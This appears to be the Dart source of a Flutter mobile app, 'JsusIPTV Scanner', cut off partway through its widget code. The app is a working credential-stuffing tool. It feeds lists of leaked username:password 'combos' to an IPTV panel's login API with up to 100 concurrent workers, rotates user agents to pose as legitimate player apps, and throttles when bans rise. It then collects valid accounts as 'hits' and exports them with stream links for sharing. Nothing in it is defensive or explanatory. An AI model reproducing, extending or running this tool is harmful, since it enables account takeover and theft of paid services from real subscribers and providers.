import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:file_picker/file_picker.dart';
import 'package:share_plus/share_plus.dart';
import 'package:path_provider/path_provider.dart';

void main() => runApp(const JsusApp());

const cG = Color(0xFF00FF41);
const cG2 = Color(0xFF00C832);
const cCy = Color(0xFF00E5FF);
const cYe = Color(0xFFFFD600);
const cRe = Color(0xFFFF1744);
const cMg = Color(0xFFE040FB);
const cDg = Color(0xFF3A6B3A);
const cBg = Color(0xFF020402);
const cBg2 = Color(0xFF060D06);
const cCd = Color(0xFF080F08);
const cBr = Color(0xFF0F2A0F);

class ComboItem {
  final String user, pass;
  ComboItem(this.user, this.pass);
}

class PanelInfo {
  final int live, vod, series;
  PanelInfo(this.live, this.vod, this.series);
}

class HitItem {
  final String username, password, panel, expira, status, conex, activ, m3u, timezone;
  PanelInfo? panelInfo;
  final String id;
  HitItem({
    required this.username, required this.password, required this.panel,
    required this.expira, required this.status, required this.conex,
    required this.activ, required this.m3u, required this.timezone,
  }) : id = DateTime.now().millisecondsSinceEpoch.toString();
}

final _httpClient = HttpClient()
  ..badCertificateCallback = (_, __, ___) => true
  ..connectionTimeout = const Duration(seconds: 10);

List<ComboItem> parseCombo(String text) {
  final lines = <ComboItem>[];
  final seen = <String>{};
  for (var raw in text.split('\n')) {
    var line = raw.trim().replaceAll('\r', '').replaceAll('\uFEFF', '');
    if (line.isEmpty || line.startsWith('#') || line.startsWith('//')) continue;
    if (!line.contains(':')) continue;
    final idx = line.indexOf(':');
    final user = line.substring(0, idx).trim();
    final pass = line.substring(idx + 1).trim();
    if (user.isEmpty || pass.isEmpty) continue;
    if (user.startsWith('http') || user.startsWith('www')) continue;
    final key = '$user:$pass';
    if (!seen.contains(key)) {
      seen.add(key);
      lines.add(ComboItem(user, pass));
    }
  }
  return lines;
}

Future<Map<String, dynamic>?> checkAccount(String panel, String user, String pass, int timeout) async {
  try {
    final url = '$panel/player_api.php?username=${Uri.encodeComponent(user)}&password=${Uri.encodeComponent(pass)}';
    final req = await _httpClient.getUrl(Uri.parse(url));
    req.headers.set('User-Agent', _ua());
    req.headers.set('Accept', '*/*');
    req.headers.set('Connection', 'keep-alive');
    final res = await req.close().timeout(Duration(seconds: timeout.toInt()));
    if (res.statusCode >= 500) return null;
    final body = await res.transform(utf8.decoder).join();
    try {
      return jsonDecode(body) as Map<String, dynamic>;
    } catch (_) {
      if (body.contains('"auth":1') || body.contains('"status":"Active"')) {
        return {'user_info': {'auth': 1, 'status': 'Active'}, 'server_info': {}};
      }
      return null;
    }
  } catch (_) {
    return null;
  }
}

Future<PanelInfo> verifyPanel(String panel, String user, String pass) async {
  try {
    final results = await Future.wait([
      _count(panel, user, pass, 'get_live_streams'),
      _count(panel, user, pass, 'get_vod_categories'),
      _count(panel, user, pass, 'get_series_categories'),
    ]);
    return PanelInfo(results[0], results[1], results[2]);
  } catch (_) {
    return PanelInfo(0, 0, 0);
  }
}

Future<int> _count(String panel, String user, String pass, String action) async {
  try {
    final url = '$panel/player_api.php?username=${Uri.encodeComponent(user)}&password=${Uri.encodeComponent(pass)}&action=$action';
    final req = await _httpClient.getUrl(Uri.parse(url));
    req.headers.set('User-Agent', _ua());
    final res = await req.close().timeout(const Duration(seconds: 15));
    final body = await res.transform(utf8.decoder).join();
    final data = jsonDecode(body);
    if (data is List) return data.length;
  } catch (_) {}
  return 0;
}

const _uas = [
  'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120.0',
  'VLC/3.0.20 LibVLC/3.0.20',
  'TiviMate/4.7.0',
  'IPTVSmarters/3.1.5',
  'okhttp/4.12.0',
  'ExoPlayer/2.19.1',
];
String _ua() => _uas[DateTime.now().millisecondsSinceEpoch % _uas.length];

class JsusApp extends StatelessWidget {
  const JsusApp({super.key});
  @override
  Widget build(BuildContext context) => MaterialApp(
    title: 'JsusIPTV',
    debugShowCheckedModeBanner: false,
    theme: ThemeData(
      scaffoldBackgroundColor: cBg,
      colorScheme: const ColorScheme.dark(primary: cG),
      fontFamily: 'monospace',
      sliderTheme: const SliderThemeData(
        activeTrackColor: cG, thumbColor: cG, inactiveTrackColor: cBr,
        overlayColor: Color(0x2200FF41),
      ),
    ),
    home: const HomeScreen(),
  );
}

class HomeScreen extends StatefulWidget {
  const HomeScreen({super.key});
  @override
  State<HomeScreen> createState() => _HomeState();
}

class _HomeState extends State<HomeScreen> with TickerProviderStateMixin {
  int _tab = 0;
  final _servers = <String>[];
  String? _srv;
  final _combo = <ComboItem>[];
  String _comboName = '';
  final _proxies = <String>[];
  final _hits = <HitItem>[];
  final _logs = <String>[];
  bool _scanning = false, _paused = false;
  int _checked = 0, _hitsN = 0, _fails = 0, _bans = 0, _total = 0;
  int _bots = 20, _timeout = 10;
  DateTime? _t0;
  Timer? _uiTimer;
  final _srvCtrl = TextEditingController();
  late AnimationController _ac;
  late Animation<double> _glow;

  @override
  void initState() {
    super.initState();
    _ac = AnimationController(vsync: this, duration: const Duration(seconds: 2))..repeat(reverse: true);
    _glow = Tween<double>(begin: 0.3, end: 1.0).animate(_ac);
  }

  @override
  void dispose() { _ac.dispose(); _uiTimer?.cancel(); super.dispose(); }

  void _log(String m) => setState(() {
    _logs.insert(0, '[${TimeOfDay.now().format(context)}] $m');
    if (_logs.length > 100) _logs.removeLast();
  });

  void _toast(String m) => ScaffoldMessenger.of(context).showSnackBar(SnackBar(
    content: Text(m, style: const TextStyle(color: cG)),
    backgroundColor: cCd,
    duration: const Duration(seconds: 2),
    behavior: SnackBarBehavior.floating,
    shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(4), side: const BorderSide(color: cBr)),
  ));

  Future<void> _loadCombo() async {
    final r = await FilePicker.platform.pickFiles(type: FileType.custom, allowedExtensions: ['txt']);
    if (r == null) return;
    final text = await File(r.files.single.path!).readAsString();
    final parsed = parseCombo(text);
    setState(() { _combo.clear(); _combo.addAll(parsed); _comboName = r.files.single.name; });
    _log('COMBO: ${r.files.single.name} — ${parsed.length} líneas');
    _toast('✓ ${parsed.length} combos cargados');
  }

  Future<void> _loadProxies() async {
    final r = await FilePicker.platform.pickFiles(type: FileType.custom, allowedExtensions: ['txt']);
    if (r == null) return;
    final text = await File(r.files.single.path!).readAsString();
    final lines = text.split('\n').map((l) => l.trim()).where((l) => l.isNotEmpty && l.contains(':')).toList();
    setState(() { _proxies.clear(); _proxies.addAll(lines); });
    _toast('✓ ${lines.length} proxies');
  }

  void _addServer() {
    var url = _srvCtrl.text.trim();
    if (url.isEmpty) { _toast('⚠ Ingresa URL'); return; }
    if (!url.startsWith('http')) url = 'http://$url';
    url = url.replaceAll(RegExp(r'/+$'), '');
    if (_servers.contains(url)) { _toast('Ya existe'); return; }
    setState(() { _servers.add(url); _srv = url; });
    _srvCtrl.clear();
    _toast('✓ Agregado');
    _log('SRV: $url');
    _verifySrv(url);
  }

  Future<void> _verifySrv(String url) async {
    _log('SRV: Verificando $url...');
    try {
      final req = await _httpClient.getUrl(Uri.parse('$url/player_api.php?username=test&password=test'));
      req.headers.set('User-Agent', _ua());
      final res = await req.close().timeout(const Duration(seconds: 6));
      if (res.statusCode < 500) {
        _log('SRV: ✓ ACTIVO (${res.statusCode})');
        _toast('✓ Servidor activo');
      } else {
        _log('SRV: ⚠ Error ${res.statusCode}');
      }
    } catch (_) {
      _log('SRV: ✗ Sin respuesta');
      _toast('⚠ Sin respuesta — agregado');
    }
  }

  Future<void> _startScan() async {
    if (_srv == null) { _toast('⚠ Configura servidor'); return; }
    if (_combo.isEmpty) { _toast('⚠ Carga combo'); return; }
    setState(() {
      _scanning = true; _paused = false;
      _checked = 0; _hitsN = 0; _fails = 0; _bans = 0;
      _total = _combo.length; _t0 = DateTime.now();
    });
    _log('SCAN ▶ $_total combos — $_bots bots');
    _log('SRV: $_srv');
    _uiTimer = Timer.periodic(const Duration(milliseconds: 400), (_) => setState(() {}));
    final q = List<ComboItem>.from(_combo)..shuffle();
    await _runScan(q);
  }

  Future<void> _runScan(List<ComboItem> q) async {
    int pos = 0, active = 0;
    final done = Completer<void>();
    void check() { if (_checked >= _total && active == 0 && !done.isCompleted) done.complete(); }

    Future<void> work(ComboItem item) async {
      while (_paused && _scanning) await Future.delayed(const Duration(milliseconds: 100));
      if (!_scanning) { active--; check(); return; }
      final data = await checkAccount(_srv!, item.user, item.pass, _timeout);
      setState(() => _checked++);
      if (data != null) {
        final ui = (data['user_info'] as Map?) ?? {};
        final si = (data['server_info'] as Map?) ?? {};
        final auth = ui['auth'];
        final st = ui['status']?.toString().toLowerCase() ?? '';
        final ok = auth == 1 || auth == '1' || auth == true ||
            ['active','activo','enabled','1','premium','trial','free'].contains(st);
        if (ok && st != 'banned' && st != 'disabled') {
          String exp = 'Ilimitado';
          final ts = ui['exp_date'];
          if (ts != null) {
            final n = int.tryParse(ts.toString());
            if (n != null && n > 0) exp = DateTime.fromMillisecondsSinceEpoch(n * 1000).toString().split(' ')[0];
          }
          final hit = HitItem(
            username: item.user, password: item.pass, panel: _srv!,
            expira: exp, status: ui['status']?.toString() ?? 'Active',
            conex: ui['max_connections']?.toString() ?? '?',
            activ: ui['active_cons']?.toString() ?? '0',
            m3u: '$_srv/get.php?username=${item.user}&password=${item.pass}&type=m3u_plus',
            timezone: si['timezone']?.toString() ?? '',
          );
          setState(() { _hits.insert(0, hit); _hitsN++; });
          _log('HIT #$_hitsN: ${item.user} → $exp');
          verifyPanel(_srv!, item.user, item.pass).then((info) {
            setState(() => hit.panelInfo = info);
            _log('PANEL: ${item.user} 📺${info.live} 🎬${info.vod} 📺${info.series}');
          });
        } else {
          setState(() => _fails++);
        }
      } else {
        setState(() => _fails++);
      }
      final br = _bans / (_checked > 0 ? _checked : 1);
      await Future.delayed(Duration(milliseconds: br > 0.3 ? 200 : br > 0.1 ? 80 : 10));
      active--; check();
    }

    while (pos < q.length && _scanning) {
      if (active < _bots && !_paused) { active++; work(q[pos++]); }
      else await Future.delayed(const Duration(milliseconds: 20));
    }
    await done.future.timeout(const Duration(hours: 24), onTimeout: () {});
    _uiTimer?.cancel();
    setState(() => _scanning = false);
    _log('FIN ✓ Hits: $_hitsN | Fail: $_fails');
    _toast('✓ Fin — $_hitsN HITs');
  }

  Future<void> _export() async {
    if (_hits.isEmpty) { _toast('No hay hits'); return; }
    final buf = StringBuffer('JsusIPTV Scanner — HITS\n${'=' * 50}\n\n');
    for (var i = 0; i < _hits.length; i++) {
      final h = _hits[i];
      buf.writeln('HIT #${i+1}');
      buf.writeln('USER   : ${h.username}');
      buf.writeln('PASS   : ${h.password}');
      buf.writeln('SERVER : ${h.panel}');
      buf.writeln('EXPIRA : ${h.expira}');
      buf.writeln('CONEX  : ${h.activ}/${h.conex}');
      if (h.panelInfo != null) {
        buf.writeln('CANALES: ${h.panelInfo!.live}');
        buf.writeln('VOD    : ${h.panelInfo!.vod}');
        buf.writeln('SERIES : ${h.panelInfo!.series}');
      }
      buf.writeln('M3U    : ${h.m3u}');
      buf.writeln('${'─' * 40}\n');
    }
    final dir = await getExternalStorageDirectory();
    final file = File('${dir!.path}/JsusIPTV_${DateTime.now().toIso8601String().split('T')[0]}.txt');
    await file.writeAsString(buf.toString());
    await Share.shareXFiles([XFile(file.path)]);
    _toast('✓ Exportado');
  }

  String get _elapsed {
    if (_t0 == null) return '00:00:00';
    final d = DateTime.now().difference(_t0!);
    return '${d.inHours.toString().padLeft(2,'0')}:${(d.inMinutes%60).toString().padLeft(2,'0')}:${(d.inSeconds%60).toString().padLeft(2,'0')}';
  }

  int get _cpm {
    if (_t0 == null || _checked == 0) return 0;
    final s = DateTime.now().difference(_t0!).inSeconds;
    return s > 0 ? (_checked / s * 60).round() : 0;
  }

  double get _pct => _total > 0 ? _checked / _total : 0;

  @override
  Widget build(BuildContext context) => Scaffold(
    backgroundColor: cBg,
    body: SafeArea(child: Column(children: [
      _header(),
      _nav(),
      Expanded(child: _content()),
    ])),
  );

  Widget _header() => Container(
    padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
    color: cBg2,
    child: Row(children: [
      Container(
        width: 40, height: 40,
        decoration: BoxDecoration(borderRadius: BorderRadius.circular(9), border: Border.all(color: cBr)),
        child: ClipRRect(
          borderRadius: BorderRadius.circular(9),
          child: Image.asset('android-icon/icon.png',
            errorBuilder: (_, __, ___) => const Center(
              child: Text('Js', style: TextStyle(color: cG, fontSize: 14, fontWeight: FontWeight.bold)))),
        ),
      ),
      const SizedBox(width: 10),
      Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        AnimatedBuilder(animation: _glow, builder: (_, __) => Text.rich(TextSpan(children: [
          TextSpan(text: 'Jsus', style: TextStyle(color: cCy, fontSize: 16, fontWeight: FontWeight.bold,
            shadows: [Shadow(color: cCy.withOpacity(_glow.value), blurRadius: 15)])),
          TextSpan(text: 'IPTV Scanner', style: TextStyle(color: cG, fontSize: 16, fontWeight: FontWeight.bold,
            shadows: [Shadow(color: cG.withOpacity(_glow.value), blurRadius: 15)])),
        ]))),
        const Text('PRO v5.0 · POTENCIA · PRECISION · VELOCIDAD',
          style: TextStyle(fontSize: 8, color: cDg, letterSpacing: 2)),
      ])),
      Column(crossAxisAlignment: CrossAxisAlignment.end, children: [
        Container(
          padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
          decoration: BoxDecoration(color: cBg, borderRadius: BorderRadius.circular(10), border: Border.all(color: cBr)),
          child: Row(mainAxisSize: MainAxisSize.min, children: [
            AnimatedBuilder(animation: _glow, builder: (_, __) => Container(
              width: 6, height: 6,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                color: _scanning ? cG : cRe,
                boxShadow: [BoxShadow(color: (_scanning ? cG : cRe).withOpacity(_scanning ? _glow.value : 0.5), blurRadius: 8)],
              ),
            )),
            const SizedBox(width: 4),
            Text(_scanning ? 'SCAN' : 'IDLE', style: const TextStyle(fontSize: 9, color: cDg, letterSpacing: 1)),
          ]),
        ),
        StreamBuilder(
          stream: Stream.periodic(const Duration(seconds: 1)),
          builder: (_, __) => Text(TimeOfDay.now().format(context),
            style: const TextStyle(fontSize: 9, color: cDg)),
        ),
      ]),
    ]),
  );

  Widget _nav() {
    const tabs = [('⚡','SCAN'),('⚙️','CONFIG'),('🎯','HITS'),('🔗','PROXY')];
    return Container(
      color: cBg2,
      child: Row(children: List.generate(4, (i) => Expanded(child: GestureDetector(
        onTap: () => setState(() => _tab = i),
        child: Container(
          padding: const EdgeInsets.symmetric(vertical: 8),
          decoration: BoxDecoration(border: Border(bottom: BorderSide(color: _tab==i ? cG : Colors.transparent, width: 2))),
          child: Column(mainAxisSize: MainAxisSize.min, children: [
            Text(tabs[i].$1, style: const TextStyle(fontSize: 15)),
            Text(tabs[i].$2, style: TextStyle(fontSize: 10, fontWeight: FontWeight.bold,
              color: _tab==i ? cG : cDg, letterSpacing: 1,
              shadows: _tab==i ? const [Shadow(color: cG, blurRadius: 8)] : null)),
          ]),
        ),
      )))),
    );
  }

  Widget _content() {
    switch (_tab) {
      case 0: return _scanTab();
      case 1: return _configTab();
      case 2: return _hitsTab();
      case 3: return _proxyTab();
      default: return _scanTab();
    }
  }

  Widget _scanTab() => ListView(padding: const EdgeInsets.all(10), children: [
    if (_scanning) ...[
      _card(accent: cG, child: Column(children: [
        Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
          _runBadge(),
          Text(_elapsed, style: const TextStyle(fontSize: 10, color: cDg)),
        ]),
        const SizedBox(height: 10),
        Column(children: [
          Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
            Text('${(_pct*100).toStringAsFixed(1)}%',
              style: const TextStyle(fontSize: 14, color: cG, fontFamily: 'monospace',
                shadows: [Shadow(color: cG, blurRadius: 10)])),
            Text('${_fmt(_checked)} / ${_fmt(_total)}',
              style: const TextStyle(fontSize: 9, color: cDg, letterSpacing: 1)),
          ]),
          const SizedBox(height: 6),
          ClipRRect(borderRadius: BorderRadius.circular(3),
            child: LinearProgressIndicator(value: _pct, backgroundColor: cBr,
              valueColor: const AlwaysStoppedAnimation(cG), minHeight: 6)),
        ]),
        const SizedBox(height: 10),
        Row(children: [
          Expanded(child: _statBox('HITS', '$_hitsN', cG)),
          const SizedBox(width: 7),
          Expanded(child: _statBox('FAIL', _fmt(_fails), cRe)),
        ]),
        const SizedBox(height: 7),
        Row(children: [
          Expanded(child: _statBox('BANS', '$_bans', cYe)),
          const SizedBox(width: 7),
          Expanded(child: _statBox('CPM', _fmt(_cpm), cYe)),
        ]),
        const SizedBox(height: 10),
        Row(children: [
          Expanded(child: _btn(_paused ? '▶ REANUDAR' : '⏸ PAUSAR',
            c: _paused ? cG : cYe, onTap: () => setState(() => _paused = !_paused))),
          const SizedBox(width: 8),
          Expanded(child: _btn('⬛ DETENER', c: cRe,
            onTap: () { setState(() => _scanning = false); _uiTimer?.cancel(); })),
        ]),
      ])),
    ] else ...[
      _card(accent: cCy, child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        _ctitle('SERVIDOR ACTIVO'),
        Text(_srv ?? 'Sin servidor configurado',
          style: TextStyle(fontSize: 11, color: _srv != null ? cCy : cDg)),
        const SizedBox(height: 8),
        _sbtn('⚙ CONFIGURAR', c: cCy, onTap: () => setState(() => _tab = 1)),
      ])),
      _card(accent: cYe, child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        _ctitle('COMBO'),
        Text(_combo.isEmpty ? 'Sin combo cargado' : '$_comboName — ${_fmt(_combo.length)} líneas',
          style: TextStyle(fontSize: 11, color: _combo.isEmpty ? cDg : cYe)),
        const SizedBox(height: 8),
        _sbtn('📂 CARGAR COMBO', c: cYe, onTap: _loadCombo),
      ])),
      _card(child: Column(children: [
        _ctitle('BOTS'),
        Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
          const Text('SIMULTÁNEOS', style: TextStyle(fontSize: 9, color: cDg, letterSpacing: 2)),
          Text('$_bots', style: const TextStyle(fontSize: 18, color: cG,
            shadows: [Shadow(color: cG, blurRadius: 8)], fontFamily: 'monospace')),
        ]),
        Slider(value: _bots.toDouble(), min: 1, max: 100,
          onChanged: (v) => setState(() => _bots = v.round())),
        Row(children: [
          Expanded(child: _ibox('PROXY', _proxies.isEmpty ? 'Directo' : '${_proxies.length} px', cMg)),
          const SizedBox(width: 7),
          Expanded(child: _ibox('TIMEOUT', '${_timeout}s', cCy)),
        ]),
      ])),
      _card(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        _ctitle('LOG'),
        Container(
          height: 100,
          decoration: BoxDecoration(color: const Color(0xFF010201), borderRadius: BorderRadius.circular(3)),
          child: ListView.builder(
            padding: const EdgeInsets.all(6),
            itemCount: _logs.length,
            itemBuilder: (_, i) => Text(_logs[i],
              style: TextStyle(fontSize: 9, color: _lc(_logs[i]), height: 1.7)),
          ),
        ),
      ])),
      _btn('⚡ INICIAR ESCANEO', c: cG, onTap: _startScan),
    ],
  ]);

  Widget _configTab() => ListView(padding: const EdgeInsets.all(10), children: [
    _sec('SERVIDOR'),
    _card(accent: cCy, child: Column(children: [
      _ctitle('AGREGAR'),
      TextField(
        controller: _srvCtrl,
        style: const TextStyle(color: cG, fontSize: 12, fontFamily: 'monospace'),
        decoration: InputDecoration(
          hintText: 'http://panel.com:8080', hintStyle: const TextStyle(color: cDg, fontSize: 12),
          filled: true, fillColor: Colors.black54,
          border: OutlineInputBorder(borderRadius: BorderRadius.circular(3), borderSide: const BorderSide(color: cBr)),
          enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(3), borderSide: const BorderSide(color: cBr)),
          focusedBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(3), borderSide: const BorderSide(color: cG)),
          contentPadding: const EdgeInsets.symmetric(horizontal: 10, vertical: 8),
        ),
      ),
      const SizedBox(height: 8),
      _btn('✓ AGREGAR', c: cCy, onTap: _addServer),
      if (_servers.isNotEmpty) ...[
        _sec('ACTIVOS'),
        ..._servers.asMap().entries.map((e) => Container(
          margin: const EdgeInsets.only(bottom: 5),
          padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 7),
          decoration: BoxDecoration(color: cBg, borderRadius: BorderRadius.circular(3), border: Border.all(color: cBr)),
          child: Row(children: [
            Expanded(child: Text(e.value, style: const TextStyle(fontSize: 10, color: cCy))),
            GestureDetector(
              onTap: () => setState(() { _servers.removeAt(e.key); _srv = _servers.isNotEmpty ? _servers[0] : null; }),
              child: Container(padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                decoration: BoxDecoration(color: cRe.withOpacity(0.1), borderRadius: BorderRadius.circular(3), border: Border.all(color: cRe.withOpacity(0.3))),
                child: const Text('✕', style: TextStyle(color: cRe, fontSize: 12))),
            ),
          ]),
        )),
      ],
    ])),
    _sec('TIMEOUT'),
    _card(child: Column(children: [
      Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
        const Text('SEGUNDOS', style: TextStyle(fontSize: 9, color: cDg, letterSpacing: 2)),
        Text('${_timeout}s', style: const TextStyle(fontSize: 18, color: cG,
          shadows: [Shadow(color: cG, blurRadius: 8)], fontFamily: 'monospace')),
      ]),
      Slider(value: _timeout.toDouble(), min: 5, max: 30,
        onChanged: (v) => setState(() => _timeout = v.round())),
    ])),
  ]);

  Widget _hitsTab() => Column(children: [
    Padding(padding: const EdgeInsets.all(10), child: Row(
      mainAxisAlignment: MainAxisAlignment.spaceBetween,
      children: [
        Text('TOTAL: ${_hits.length}', style: const TextStyle(fontSize: 12, color: cDg, fontWeight: FontWeight.bold, letterSpacing: 2)),
        Row(children: [
          _sbtn('💾 EXPORTAR', c: cCy, onTap: _export),
          const SizedBox(width: 6),
          _sbtn('🗑 LIMPIAR', c: cRe, onTap: () => setState(() => _hits.clear())),
        ]),
      ],
    )),
    Expanded(child: _hits.isEmpty
      ? Center(child: Column(mainAxisSize: MainAxisSize.min, children: [
          const Text('🎯', style: TextStyle(fontSize: 32)),
          const SizedBox(height: 8),
          const Text('LOS HITS APARECERÁN AQUÍ', style: TextStyle(fontSize: 10, color: cDg, letterSpacing: 1)),
        ]))
      : ListView.builder(padding: const EdgeInsets.symmetric(horizontal: 10),
          itemCount: _hits.length,
          itemBuilder: (_, i) => _hitCard(_hits[i]))),
  ]);

  Widget _hitCard(HitItem h) => Container(
    margin: const EdgeInsets.only(bottom: 10),
    decoration: BoxDecoration(
      gradient: const LinearGradient(colors: [Color(0xFF002300), Color(0xFF000F00)]),
      borderRadius: BorderRadius.circular(6),
      border: Border(
        left: const BorderSide(color: cG, width: 2),
        top: BorderSide(color: cG.withOpacity(0.2)),
        right: BorderSide(color: cG.withOpacity(0.1)),
        bottom: BorderSide(color: cG.withOpacity(0.1)),
      ),
    ),
    child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
      Padding(padding: const EdgeInsets.fromLTRB(12,10,12,8), child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        Text('👤 ${h.username}', style: const TextStyle(color: cG, fontSize: 13, fontWeight: FontWeight.bold)),
        Text('🔑 ${h.password}', style: const TextStyle(color: cDg, fontSize: 10)),
        Text('🖥 ${h.panel}', style: const TextStyle(color: cCy, fontSize: 9)),
        const SizedBox(height: 6),
        Wrap(spacing: 5, runSpacing: 4, children: [
          _badge('📅 ${h.expira}', cYe),
          _badge('🔗 ${h.activ}/${h.conex}', cCy),
          _badge('✓ ${h.status}', cG),
          if (h.timezone.isNotEmpty) _badge('🌍 ${h.timezone}', cMg),
        ]),
      ])),
      Container(
        padding: const EdgeInsets.fromLTRB(12,8,12,8),
        decoration: BoxDecoration(border: Border(top: BorderSide(color: cG.withOpacity(0.08)))),
        child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
          const Text('📊 PANEL', style: TextStyle(fontSize: 10, color: cDg, letterSpacing: 2)),
          const SizedBox(height: 8),
          h.panelInfo == null
            ? const Row(children: [
                SizedBox(width:14,height:14,child:CircularProgressIndicator(strokeWidth:2,color:cG)),
                SizedBox(width:8),
                Text('Verificando...', style: TextStyle(fontSize:10,color:cDg)),
              ])
            : Row(children: [
                Expanded(child: _pbox('📺', '${h.panelInfo!.live}', 'CANALES', cG)),
                const SizedBox(width:5),
                Expanded(child: _pbox('🎬', '${h.panelInfo!.vod}', 'VOD', cCy)),
                const SizedBox(width:5),
                Expanded(child: _pbox('📺', '${h.panelInfo!.series}', 'SERIES', cMg)),
              ]),
        ]),
      ),
      Padding(padding: const EdgeInsets.fromLTRB(12,0,12,10), child: Row(children: [
        _sbtn('📋 COPIAR', c: cCy, onTap: () {
          var t = 'SERVER: ${h.panel}\nUSER: ${h.username}\nPASS: ${h.password}\nEXP: ${h.expira}';
          if (h.panelInfo != null) t += '\nCANALES: ${h.panelInfo!.live}\nVOD: ${h.panelInfo!.vod}\nSERIES: ${h.panelInfo!.series}';
          t += '\nM3U: ${h.m3u}';
          Clipboard.setData(ClipboardData(text: t));
          _toast('✓ Copiado');
        }),
        const SizedBox(width:6),
        _sbtn('📺 M3U', c: cG, onTap: () {
          Clipboard.setData(ClipboardData(text: h.m3u));
          _toast('✓ M3U copiado');
        }),
        const SizedBox(width:6),
        _sbtn('🔄', c: cMg, onTap: () async {
          setState(() => h.panelInfo = null);
          final info = await verifyPanel(h.panel, h.username, h.password);
          setState(() => h.panelInfo = info);
          _toast('✓ Verificado');
        }),
      ])),
    ]),
  );

  Widget _proxyTab() => ListView(padding: const EdgeInsets.all(10), children: [
    _card(accent: cMg, child: Column(children: [
      _ctitle('PROXIES'),
      _btn('📂 CARGAR ARCHIVO', c: cMg, onTap: _loadProxies),
      const SizedBox(height: 8),
      _prow('TOTAL', '${_proxies.length}'),
      _prow('ESTADO', _proxies.isEmpty ? 'Sin proxies' : 'Cargados'),
      const SizedBox(height: 8),
      _btn('✗ LIMPIAR', c: cRe, onTap: () => setState(() => _proxies.clear())),
    ])),
  ]);

  Color _lc(String l) {
    if (l.contains('HIT')) return cG;
    if (l.contains('FAIL') || l.contains('ERROR')) return cRe;
    if (l.contains('WARN') || l.contains('PAUSAD')) return cYe;
    if (l.contains('PANEL') || l.contains('SRV')) return cCy;
    return cDg;
  }

  Widget _runBadge() => Container(
    padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
    decoration: BoxDecoration(color: cG.withOpacity(0.07), borderRadius: BorderRadius.circular(10), border: Border.all(color: cG.withOpacity(0.2))),
    child: Row(mainAxisSize: MainAxisSize.min, children: [
      AnimatedBuilder(animation: _glow, builder: (_, __) => Container(width:5,height:5,
        decoration: BoxDecoration(shape: BoxShape.circle, color: cG,
          boxShadow: [BoxShadow(color: cG.withOpacity(_glow.value), blurRadius: 8)]))),
      const SizedBox(width: 5),
      const Text('ESCANEANDO', style: TextStyle(fontSize: 9, color: cG, letterSpacing: 2)),
    ]),
  );

  Widget _statBox(String label, String val, Color c) => Container(
    padding: const EdgeInsets.all(10),
    decoration: BoxDecoration(color: cBg, borderRadius: BorderRadius.circular(4), border: Border.all(color: cBr)),
    child: Column(children: [
      Text(val, style: TextStyle(fontSize: 24, fontWeight: FontWeight.bold, color: c,
        shadows: [Shadow(color: c, blurRadius: 20)], fontFamily: 'monospace')),
      Text(label, style: const TextStyle(fontSize: 8, color: cDg, letterSpacing: 2)),
    ]),
  );

  Widget _card({Color accent = cBr, required Widget child}) => Container(
    margin: const EdgeInsets.only(bottom: 10),
    padding: const EdgeInsets.fromLTRB(14, 12, 12, 12),
    decoration: BoxDecoration(
      gradient: const LinearGradient(begin: Alignment.topLeft, end: Alignment.bottomRight,
        colors: [Color(0xFF000C00), Color(0xFF000600)]),
      borderRadius: BorderRadius.circular(6),
      border: Border.all(color: cBr),
    ),
    child: Stack(children: [
      Positioned(left: -14, top: -12, bottom: -12, child: Container(width: 2,
        decoration: BoxDecoration(gradient: LinearGradient(
          begin: Alignment.topCenter, end: Alignment.bottomCenter,
          colors: [accent, Colors.transparent])))),
      child,
    ]),
  );

  Widget _ctitle(String t) => Padding(padding: const EdgeInsets.only(bottom: 10), child: Row(children: [
    const Text('▸', style: TextStyle(color: cG, fontSize: 12)),
    const SizedBox(width: 6),
    Text(t, style: const TextStyle(fontSize: 11, color: cDg, letterSpacing: 2.5, fontWeight: FontWeight.bold)),
  ]));

  Widget _sec(String t) => Padding(padding: const EdgeInsets.only(bottom: 7, top: 4), child: Row(children: [
    Text(t, style: const TextStyle(fontSize: 10, color: cDg, letterSpacing: 3, fontWeight: FontWeight.bold)),
    const SizedBox(width: 8),
    Expanded(child: Container(height: 1,
      decoration: const BoxDecoration(gradient: LinearGradient(colors: [cBr, Colors.transparent])))),
  ]));

  Widget _btn(String label, {required Color c, required VoidCallback onTap}) => GestureDetector(
    onTap: onTap,
    child: Container(
      width: double.infinity, padding: const EdgeInsets.symmetric(vertical: 12),
      margin: const EdgeInsets.only(bottom: 7),
      decoration: BoxDecoration(
        gradient: LinearGradient(colors: [c.withOpacity(0.05), c.withOpacity(0.1)]),
        borderRadius: BorderRadius.circular(4),
        border: Border.all(color: c.withOpacity(0.5)),
        boxShadow: [BoxShadow(color: c.withOpacity(0.1), blurRadius: 15)],
      ),
      child: Text(label, textAlign: TextAlign.center,
        style: TextStyle(color: c, fontSize: 13, fontWeight: FontWeight.bold, letterSpacing: 2,
          shadows: [Shadow(color: c, blurRadius: 8)])),
    ),
  );

  Widget _sbtn(String label, {required Color c, required VoidCallback onTap}) => GestureDetector(
    onTap: onTap,
    child: Container(
      padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 7),
      decoration: BoxDecoration(color: c.withOpacity(0.07), borderRadius: BorderRadius.circular(4), border: Border.all(color: c.withOpacity(0.3))),
